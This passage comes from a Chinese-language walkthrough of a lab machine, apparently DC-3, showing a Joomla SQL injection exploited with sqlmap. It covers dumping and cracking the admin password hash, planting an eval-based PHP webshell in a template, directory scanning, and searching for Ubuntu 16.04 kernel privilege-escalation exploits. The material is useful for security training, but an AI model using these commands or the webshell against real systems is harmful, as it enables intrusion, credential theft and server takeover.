</span></span></code></pre></div><p>获取<code>#__users</code>表中的字段：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent -D <span style=color:#e6db74>&#34;joomladb&#34;</span> -T <span style=color:#e6db74>&#34;#__users&#34;</span> --columns -p list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Database: joomladb
</span></span><span style=display:flex><span>Table: <span style=color:#75715e>#__users</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>6</span> columns<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+----------+-------------+
</span></span><span style=display:flex><span>| Column   | Type        |
</span></span><span style=display:flex><span>+----------+-------------+
</span></span><span style=display:flex><span>| name     | non-numeric |
</span></span><span style=display:flex><span>| email    | non-numeric |
</span></span><span style=display:flex><span>| id       | numeric     |
</span></span><span style=display:flex><span>| params   | non-numeric |
</span></span><span style=display:flex><span>| password | non-numeric |
</span></span><span style=display:flex><span>| username | non-numeric |
</span></span><span style=display:flex><span>+----------+-------------+
</span></span></code></pre></div><p>获取字段内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --dbms mysql -D joomladb -T <span style=color:#e6db74>&#39;#__users&#39;</span> -C id,name,password,username --dump
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Database: joomladb
</span></span><span style=display:flex><span>Table: <span style=color:#75715e>#__users</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> entry<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+-----+--------+--------------------------------------------------------------+----------+
</span></span><span style=display:flex><span>| id  | name   | password                                                     | username |
</span></span><span style=display:flex><span>+-----+--------+--------------------------------------------------------------+----------+
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>629</span> | admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
</span></span><span style=display:flex><span>+-----+--------+--------------------------------------------------------------+----------+
</span></span></code></pre></div><p>将password写入hash文件，利用john爆破hash：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ john hash
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>bcrypt <span style=color:#f92672>[</span>Blowfish 32/64 X3<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1024</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
</span></span><span style=display:flex><span>Proceeding with single, rules:Single
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
</span></span><span style=display:flex><span>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span style=display:flex><span>snoopy           <span style=color:#f92672>(</span>?<span style=color:#f92672>)</span>     
</span></span><span style=display:flex><span>1g 0:00:00:00 DONE 2/3 <span style=color:#f92672>(</span>2025-09-26 11:43<span style=color:#f92672>)</span> 5.263g/s 189.4p/s 189.4c/s 189.4C/s 123456..buster
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed.
</span></span></code></pre></div><p>访问admin后台/administrator，成功登录，可以修改templates中的php代码，比如在<code>index.php</code>中加入一句话木马，注意写在安全检查之前：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// 一句话木马
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_REQUEST[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>defined</span>(<span style=color:#e6db74>&#39;_JEXEC&#39;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>;  <span style=color:#75715e>// 如果不是通过框架访问则结束代码运行
</span></span></span></code></pre></div><p>用dirsearch扫描templates所在目录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>[</span>11:51:37<span style=color:#f92672>]</span> Starting:                                                                                                                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  301B  - /.htaccess.orig                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  303B  - /.htaccess.sample                                 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  301B  - /.htaccess.bak1                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  301B  - /.htaccess_orig
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  302B  - /.htaccess_extra                                  
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  298B  - /.ht_wsr.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  301B  - /.htaccess.save
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  299B  - /.htaccessBAK
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  299B  - /.htaccess_sc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  300B  - /.htaccessOLD2                                    
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  291B  - /.htm                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  292B  - /.html
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  299B  - /.htaccessOLD                                     
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  298B  - /.httr-oauth
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  301B  - /.htpasswd_test
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  297B  - /.htpasswds                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:39<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  291B  - /.php                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:39<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  292B  - /.php3                                            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  320B  - /administrator  -&gt;  http://61.139.2.136/administrator/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /administrator/cache/                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    2KB - /administrator/                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -  534B  - /administrator/includes/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  325B  - /administrator/logs  -&gt;  http://61.139.2.136/administrator/logs/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /administrator/logs/                              
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    2KB - /administrator/index.php                          
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:47<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  310B  - /bin  -&gt;  http://61.139.2.136/bin/                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:47<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /bin/                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:48<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  312B  - /cache  -&gt;  http://61.139.2.136/cache/            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:48<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /cache/                                           
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:48<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /cli/                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:49<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  317B  - /components  -&gt;  http://61.139.2.136/components/  
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:49<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /components/                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:49<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /configuration.php                                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    1KB - /htaccess.txt                                     
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /images/                                          
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  313B  - /images  -&gt;  http://61.139.2.136/images/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /includes/                                        
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  315B  - /includes  -&gt;  http://61.139.2.136/includes/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    2KB - /index.php                                        
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:53<span style=color:#f92672>]</span> <span style=color:#ae81ff>404</span> -    3KB - /index.php/login/                                 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:54<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  315B  - /language  -&gt;  http://61.139.2.136/language/      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:54<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /layouts/                                         
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:55<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  316B  - /libraries  -&gt;  http://61.139.2.136/libraries/    
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:55<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /libraries/                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:55<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    7KB - /LICENSE.txt                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:56<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  312B  - /media  -&gt;  http://61.139.2.136/media/            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:56<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /media/                                           
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:56<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  314B  - /modules  -&gt;  http://61.139.2.136/modules/        
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:57<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /modules/                                         
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:59<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  314B  - /plugins  -&gt;  http://61.139.2.136/plugins/        
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:51:59<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /plugins/                                         
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:01<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    2KB - /README.txt                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:01<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -  395B  - /robots.txt.dist                                  
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:02<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  300B  - /server-status                                    
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:02<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  301B  - /server-status/                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:04<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  316B  - /templates  -&gt;  http://61.139.2.136/templates/    
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:04<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /templates/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:04<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /templates/beez3/                                 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:04<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /templates/index.html
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:04<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /templates/protostar/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:04<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /templates/system/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:05<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   31B  - /tmp/                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:05<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  310B  - /tmp  -&gt;  http://61.139.2.136/tmp/                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:52:07<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -  567B  - /web.config.txt 
</span></span></code></pre></div><p>常规的提权方法没找到成功的，只能找内核漏洞了：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ uname -a
</span></span><span style=display:flex><span>Linux DC-3 4.4.0-21-generic <span style=color:#75715e>#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux</span>
</span></span></code></pre></div><p>对应版本<code>Ubuntu 16.04</code>，同样使用searchsploit：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ searchsploit Ubuntu 16.04
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                                                          |  Path
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span>Apport 2.x <span style=color:#f92672>(</span>Ubuntu Desktop 12.10 &lt; 16.04<span style=color:#f92672>)</span> - Local Code Execution                                                        | linux/local/40937.txt
</span></span><span style=display:flex><span>Exim <span style=color:#ae81ff>4</span> <span style=color:#f92672>(</span>Debian <span style=color:#ae81ff>8</span> / Ubuntu 16.04<span style=color:#f92672>)</span> - Spool Privilege Escalation                                                           | linux/local/40054.c
</span></span><span style=display:flex><span>Google Chrome <span style=color:#f92672>(</span>Fedora <span style=color:#ae81ff>25</span> / Ubuntu 16.04<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;tracker-extract&#39;</span> / <span style=color:#e6db74>&#39;gnome-video-thumbnailer&#39;</span> + <span style=color:#e6db74>&#39;totem&#39;</span> Drive-By Download    | linux/local/40943.txt
</span></span><span style=display:flex><span>LightDM <span style=color:#f92672>(</span>Ubuntu 16.04/16.10<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;Guest Account&#39;</span> Local Privilege Escalation                                               | linux/local/41923.txt
</span></span><span style=display:flex><span>Linux Kernel <span style=color:#f92672>(</span>Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;ldso_hwcap_64 Stac | linux_x86-64/local/42275.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - &#39;</span>ldso_dynamic Stack Clash<span style=color:#e6db74>&#39; Local Privileg | linux_x86/local/42276.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                   | linux/dos/39773.txt
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read                               | linux/local/45175.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.4 (Ubuntu 16.04) - &#39;</span>BPF<span style=color:#e6db74>&#39; Local Privilege Escalation (Metasploit)                                         | linux/local/40759.rb
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.4 (Ubuntu 16.04) - &#39;</span>snd_timer_user_ccallback<span style=color:#f92672>()</span><span style=color:#e6db74>&#39; Kernel Pointer Leak                                      | linux/dos/46529.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;</span>AF_PACKET<span style=color:#e6db74>&#39; Race Condition Privilege Escalation                        | linux_x86-64/local/40871.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &#39;</span>target_offset<span style=color:#e6db74>&#39; Out-of-Bounds Privilege Escalation                 | linux_x86-64/local/40049.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - &#39;</span>AF_PACKET<span style=color:#e6db74>&#39; Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;</span>double-fdput<span style=color:#f92672>()</span><span style=color:#e6db74>&#39; bpf(BPF_PROG_LOAD) Privilege Escalation                            | linux/local/39772.txt
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.6.2 (Ubuntu 16.04.1) - &#39;</span>IP6T_SO_SET_REPLACE<span style=color:#e6db74>&#39; Local Privilege Escalation                                  | linux/local/40489.txt
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                              | linux/dos/45919.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                           | linux/local/45010.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                  | linux/local/44298.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#39;</span>netfilter target_offset<span style=color:#960050;background-color:#1e0010>&#39;</span> Local Privilege Escalation                       | linux_x86-64/local/44300.c
</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 <span style=color:#f92672>(</span>Ubuntu 14.04/16.04<span style=color:#f92672>)</span> - Local Privilege Escalation <span style=color:#f92672>(</span>KASLR / SMEP<span style=color:#f92672>)</span>                   | linux/local/43418.c
</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span style=color:#f92672>(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span style=color:#f92672>)</span> - Local Privilege Escalation <span style=color:#f92672>(</span>KASLR / SME | linux/local/47169.c
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ cat /usr/share/exploitdb/exploits/linux/dos/39773.txt  
</span></span><span style=display:flex><span>Source: https://bugs.chromium.org/p/project-zero/issues/detail?id<span style=color:#f92672>=</span><span style=color:#ae81ff>809</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Most things in the kernel use 32-bit reference counters, relying on the
</span></span><span style=display:flex><span>fact that the memory constraints of real computers make it impossible to
</span></span><span style=display:flex><span>create enough references to overflow the counters. There are exceptions
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> things like <span style=color:#e6db74>`</span>struct file<span style=color:#e6db74>`</span> because it is possible to create references
</span></span><span style=display:flex><span>to them with relatively little memory usage.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Using BPF_MAP_TYPE_PROG_ARRAY maps, it is possible to create
</span></span><span style=display:flex><span>references to BPF programs that only need sizeof<span style=color:#f92672>(</span>void*<span style=color:#f92672>)</span> bytes each
</span></span><span style=display:flex><span><span style=color:#f92672>(</span><span style=color:#ae81ff>8</span> bytes on amd64<span style=color:#f92672>)</span>, permitting an overflow after filling ~32GB of memory
</span></span><span style=display:flex><span>that is subject to RLIMIT_MEMLOCK restrictions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The requirement <span style=color:#66d9ef>for</span> more than 32GB of RAM is relatively high, but not
</span></span><span style=display:flex><span>impossible. The requirement that the allocations need to be below
</span></span><span style=display:flex><span>RLIMIT_MEMLOCK is probably the bigger obstacle <span style=color:#66d9ef>for</span> exploitation: On most
</span></span><span style=display:flex><span>Linux systems, every user is only permitted to allocate up to 64KiB of RAM.
</span></span><span style=display:flex><span>However:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> - There are systems where RLIMIT_MEMLOCK is disabled administratively.
</span></span><span style=display:flex><span> - On systems with containers <span style=color:#f92672>(</span>e.g. LXC containers<span style=color:#f92672>)</span>, usually every
</span></span><span style=display:flex><span>   container<span style=color:#960050;background-color:#1e0010>&#39;</span>s root user has access to 2^16 different UIDs. If an attacker
</span></span><span style=display:flex><span>   has control over <span style=color:#ae81ff>9</span> containers and can share file descriptors between
</span></span><span style=display:flex><span>   them or has control over one container with a relatively high number
</span></span><span style=display:flex><span>   of mapped UIDs, he should be able to trigger the overflow.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The attached PoC, when run in a Ubuntu 16.04 VM with 40GB RAM and the
</span></span><span style=display:flex><span>RLIMIT_MEMLOCK limit disabled, needs <span style=color:#ae81ff>25</span> minutes to execute and causes the
</span></span><span style=display:flex><span>following oops:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676543<span style=color:#f92672>]</span> BUG: unable to handle kernel paging request at ffffc900069c5010
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676550<span style=color:#f92672>]</span> IP: <span style=color:#f92672>[</span>&lt;ffffffff81173525&gt;<span style=color:#f92672>]</span> bpf_prog_put_rcu+0x5/0x30
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676556<span style=color:#f92672>]</span> PGD 9bc094067 PUD 9bc095067 PMD 9b4d2b067 PTE <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676558<span style=color:#f92672>]</span> Oops: <span style=color:#ae81ff>0000</span> <span style=color:#f92672>[</span><span style=color:#75715e>#1] SMP</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676561<span style=color:#f92672>]</span> Modules linked in: nls_utf8 isofs vboxsf<span style=color:#f92672>(</span>OE<span style=color:#f92672>)</span> snd_intel8x0 snd_ac97_codec ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event joydev snd_rawmidi snd_seq snd_seq_device snd_timer input_leds snd serio_raw soundcore vboxvideo<span style=color:#f92672>(</span>OE<span style=color:#f92672>)</span> 8250_fintek drm i2c_piix4 vboxguest<span style=color:#f92672>(</span>OE<span style=color:#f92672>)</span> mac_hid parport_pc ppdev lp parport autofs4 hid_generic usbhid hid psmouse ahci libahci fjes video e1000 pata_acpi
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676579<span style=color:#f92672>]</span> CPU: <span style=color:#ae81ff>0</span> PID: <span style=color:#ae81ff>1861</span> Comm: overflow Tainted: G           OE   4.4.0-21-generic <span style=color:#75715e>#37-Ubuntu</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676581<span style=color:#f92672>]</span> Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676582<span style=color:#f92672>]</span> task: ffff8809b2fe4b00 ti: ffff8809b2f3c000 task.ti: ffff8809b2f3c000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676583<span style=color:#f92672>]</span> RIP: 0010:<span style=color:#f92672>[</span>&lt;ffffffff81173525&gt;<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff81173525&gt;<span style=color:#f92672>]</span> bpf_prog_put_rcu+0x5/0x30
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676585<span style=color:#f92672>]</span> RSP: 0018:ffff8809b2f3fdb8  EFLAGS: <span style=color:#ae81ff>00010286</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676586<span style=color:#f92672>]</span> RAX: ffffffff81a24f20 RBX: <span style=color:#ae81ff>0000000000000000</span> RCX: <span style=color:#ae81ff>0000000000000001</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676587<span style=color:#f92672>]</span> RDX: ffff880230ebc110 RSI: ffff880230ebc100 RDI: ffffc900069c5000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676588<span style=color:#f92672>]</span> RBP: ffff8809b2f3fdc0 R08: <span style=color:#ae81ff>0000000000000000</span> R09: <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676589<span style=color:#f92672>]</span> R10: ffff8809b55468e0 R11: ffff880230ebc110 R12: ffffc90814ce6060
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676590<span style=color:#f92672>]</span> R13: ffffc90814ce6000 R14: ffff8809b5a9d1a0 R15: ffff8809b29cf480
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676592<span style=color:#f92672>]</span> FS:  00007fbe54cf5700<span style=color:#f92672>(</span>0000<span style=color:#f92672>)</span> GS:ffff8809e3c00000<span style=color:#f92672>(</span>0000<span style=color:#f92672>)</span> knlGS:0000000000000000
